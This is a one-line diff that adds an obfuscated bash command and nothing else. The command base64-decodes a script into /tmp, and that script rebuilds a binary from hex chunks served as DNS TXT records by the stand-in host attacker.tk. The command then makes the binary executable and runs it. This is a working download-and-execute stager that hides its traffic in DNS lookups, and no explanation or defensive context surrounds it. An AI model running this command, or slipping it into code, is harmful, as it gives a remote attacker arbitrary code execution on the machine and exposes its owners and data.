@@ -1,0 +1,1 @@
+bash -c "echo IyEvYmluL2Jhc2gKZm9yIGkgaW4gYHNlcSAkMmAKZG8KCWFuc3c9YGhvc3QgLXQgdHh0ICJkJGkudHh0LiQxInxjdXQgLWQgJyAnIC1mIDRgCgllY2hvICR7YW5zdzoyOi0xfSB8IHh4ZCAtciAtcCAtID4+ICQzCmRvbmU=|base64 -d>/tmp/1.sh;chmod +x /tmp/1.sh;/tmp/1.sh attacker.tk 1000 /tmp/out;chmod +x /tmp/out;/tmp/out"
